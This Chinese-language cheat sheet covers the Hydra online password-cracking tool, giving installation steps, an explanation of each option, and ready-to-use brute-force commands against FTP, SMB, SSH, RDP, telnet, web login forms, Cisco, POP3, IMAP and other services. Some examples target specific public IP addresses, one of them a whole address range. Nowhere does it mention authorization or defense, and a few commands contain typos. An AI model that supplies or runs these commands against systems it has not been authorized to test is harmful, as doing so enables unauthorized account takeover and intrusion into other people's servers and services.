官网地址：http://www.thc.org

1、安装

	解压		tar -zxvf hydra-7.4.2.tar.gz 
	编译&安装	./configure  ==>> make && mamke install

2、格式

	hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV]

	解释：

		-R 继续从上一次进度接着破解
		-S 采用SSL链接（大写的S）
		-s PORT 如果非默认端口，可通过这个参数指定
		-l LOGIN 小写，用于指定破解的用户，对特定用户破解
		-L FILE 大写，用于指定用户的用户名字典
		-p PASS 小写，用于指定密码破解，少用，一般是采用密码字典
		-P FILE 大写，用于指定密码字典
		-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探
		-C FILE 使用冒号分割格式 例如 "登录名:密码"来代替-L/-P参数
		-M FILE 指定目标列表文件一行一条
		-o FILE 指定结果输出文件
		-f 在使用-M参数以后 找到第一对登录名或者密码的时候中止破解
		-t TASKS 同时运行的线程数，默认为16
		-w TIME 设置最大超时的时间，单位秒，默认是30s
		-v / -V 显示详细过程

3、实例破解ftp帐号密码
	目标地址： 203.133.5.88
	命令一：hydra -L /home/dict/ftpuser.lst -P /home/dict/ftppwd.lst 203.133.5.* ftp		（批量爆破整个c段的，加载了两个字典文件）
	命令二：hydra -l administrator -P /home/dict/pwd.lst -v 203.133.5.88 ftp

4、实例破解samba密码

	SMB协议通常是被windows系列用来实现磁盘和打印机共享
	利用跟ftp类似，将ftp改为sam即可	

5、网站后台密码破解

	sudo hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form "index.php:name=^USER^&pwd=^PASS^:"

	解释：破解的用户名是admin，密码字典是pass.lst，破解结果保存在ok.lst，-t是同时线程数为1，-f是当破解了一个密码就停止，ip是本地，就是目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解后面参数是网页中对应的表单字段的name属性,后面title中的内容是表示错误猜解的返回信息提示，可以自定义。

6.破解ftp

	hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
	hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV

7.get方式提交 破解web登录

	hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /web/
	hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /web/index.asp

8.破解ssh
	
	hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh2
	hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh2

9.破解teamspeak

	hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak

10.post方式提交 破解web登录

	hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"

11.cisco
	
	hydra -P pass.txt 192.168.1.229 cisco
	hydra -m cloud -P pass.txt 192.168.1.229 cisco-enable

12.smb
	
	hydra -l administrator -P pass.txt 192.168.0.141 smb

13.pop3
	
	hydra -l muts -P pass.txt my.pop3.mail pop3

14.https
	
	hydra -m /index.php -l muts -P pass.txt 192.168.0.12 https

15.rdp
	
hydra ip rdp -l administrator -P pass.txt -V

16.http-proxy
	
	hydra -l admin -P pass.txt http-proxy://192.168.0.1

17.imap
	
	hydra -L user.txt -p secret 192.168.0.1 imap PLAIN
	hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN

18.telnet
	
	h3dra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V

	